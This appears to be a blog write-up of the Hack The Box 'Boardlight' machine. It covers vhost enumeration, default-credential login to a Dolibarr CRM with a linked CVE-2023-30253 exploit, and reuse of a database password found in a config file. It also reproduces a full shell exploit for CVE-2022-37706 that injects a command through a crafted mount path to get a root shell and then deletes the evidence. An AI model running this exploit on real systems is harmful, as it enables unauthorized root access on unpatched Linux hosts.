+++
title = 'Boardlight'
description = 'Easy Linux box'
date = 2024-08-24T16:50:47-04:00
draft = true
tags = ["linux"]
category = ["htb"]
summary = "HTB - Linux - Easy"
+++



A Really easy HTB box that looks into vhost enumeration and a CVE 2023-30253.


# Enum

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## 80
```bash
┌──(fish㉿kali)-[~/htb/BoardLight]
└─$ whatweb $IP     
http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]

```



This took a while :( but have to check for vhosts when you have a domain.


We can us ffuf to do this:
```bash
┌──(fish㉿kali)-[~/htb/BoardLight]
└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H 'Host: FUZZ.board.htb' -fs 15949
```



And we find one! `crm.board.htb`, we need to add it to our hosts file then we can browse to it directly


Looking through the source, we see some comments but I don't think these will help us.


```html
<!-- authentication mode = dolibarr -->
<!-- cookie name used for this session = DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92 -->
<!-- urlfrom in this session =  -->

<!-- Common footer is not used for login page, this is same than footer but inside login tpl -->
```

A google search shows multiple exploits and a CVE(2023-30253):



---
# Foothold


We found the site is running a vulnerable version of Dolibarr a CRM with a RCE exploit available but it requires a valid username and password.

Trying the low hanging fruit `admin:admin` gets us in and we can run the first github exploit result after reading through the python code.


We're going to want to look for a config file because we know the app interfaces with mysql we might be able to find some hardcoded creds, linpeas doesn't pick up anything but if we look at the documentation for dolibarr we find it at `/var/www/html/crm.board.htb/htdocs/conf/conf.php`

https://wiki.dolibarr.org/index.php?title=Configuration_file

And we get a potential password:


`serverfun2$2023!!`

We could potentially log into the database and look for anything else interesting or we can check for password re-use. We did find another user on  the box `larissa`. 



Logging in with the cred above as larissa works!


## Exploits
#CVE-2023-30253
https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253


--- 
# PrivEsc

Running linpeas again finds some interesting SUID binaries


```bash
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)

```


```bash

#!/usr/bin/bash
# Idea by MaherAzzouz
# Development by nu11secur1ty

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

# The actual problem
file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Welcome to the rabbit hole :)"

echo -e "If it is not found in fstab, big deal :D "
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

read -p "Press any key to clean the evedence..."
echo -e "Please wait... "

sleep 5
rm -rf /tmp/exploit
rm -rf /tmp/net
echo -e "Done; Everything is clear ;)"
```

We can create a exploit.sh with the exploit code, make it executable with `chmod +x `, and run it to get root.




## Exploits
https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2022-37706/docs/exploit.sh
#suid

---



